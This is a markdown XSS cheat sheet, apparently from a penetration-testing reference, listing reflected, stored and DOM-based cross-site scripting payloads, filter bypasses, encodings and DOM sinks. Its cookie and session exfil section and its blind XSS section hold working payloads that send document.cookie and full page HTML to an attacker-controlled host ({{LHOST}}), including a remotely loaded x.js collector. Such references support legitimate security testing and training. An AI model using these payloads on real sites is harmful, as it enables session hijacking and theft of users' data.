---
title: XSS (Cross-Site Scripting)
category: web
description: Reflected, stored, DOM-based — detection, payloads, and filter bypasses.
tags: [xss, web, injection]
os: [any]
order: 20
---

## Quick probes

```html
<script>alert(1)</script>
"><svg onload=alert(1)>
'><img src=x onerror=alert(1)>
javascript:alert(1)
<iframe srcdoc="<script>alert(1)</script>">
```

## Context-aware payloads

```html
<!-- inside HTML body -->
<svg/onload=alert(1)>

<!-- inside attribute value (double-quoted) -->
" autofocus onfocus=alert(1) x="

<!-- inside attribute value (single-quoted) -->
' autofocus onfocus=alert(1) x='

<!-- inside <script> string -->
';alert(1);//
\";alert(1);//

<!-- inside URL attribute -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- inside JS template literal -->
${alert(1)}
```

## Cookie / session exfil

```html
<script>new Image().src='http://{{LHOST}}/?c='+document.cookie</script>
<script>fetch('http://{{LHOST}}/?c='+document.cookie)</script>
<svg/onload="fetch('http://{{LHOST}}/?c='+btoa(document.body.innerHTML))">
```

## Filter bypasses

```html
<ScRiPt>alert(1)</ScRiPt>
<svg><script>alert&#40;1)</script>
<img src=x onerror="alert(1)">
<a href="javas&#9;cript:alert(1)">x</a>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<body onload=alert(1)>
```

Encodings that often survive:

```text
%26%2360%3B → &#60; → <
&#x3c;script&#x3e;
\x3cscript\x3e
String.fromCharCode(60,115,99,114,105,112,116,62)
```

## DOM XSS sinks to grep

```text
innerHTML, outerHTML, document.write, document.writeln,
eval, setTimeout(str), setInterval(str), Function(str),
location, location.href, location.hash, src=, srcdoc=,
$.html(), $(html), insertAdjacentHTML
```

## Blind XSS

Host a payload at `http://{{LHOST}}/x.js`:

```html
"><script src="http://{{LHOST}}/x.js"></script>
```

```js
// x.js
fetch('http://{{LHOST}}/log?u='+location+'&c='+document.cookie+'&h='+btoa(document.documentElement.outerHTML))
```

## CSP-friendly tricks

If `default-src 'self'`: look for JSONP endpoints, file uploads under same-origin, or `<base href>` injection.
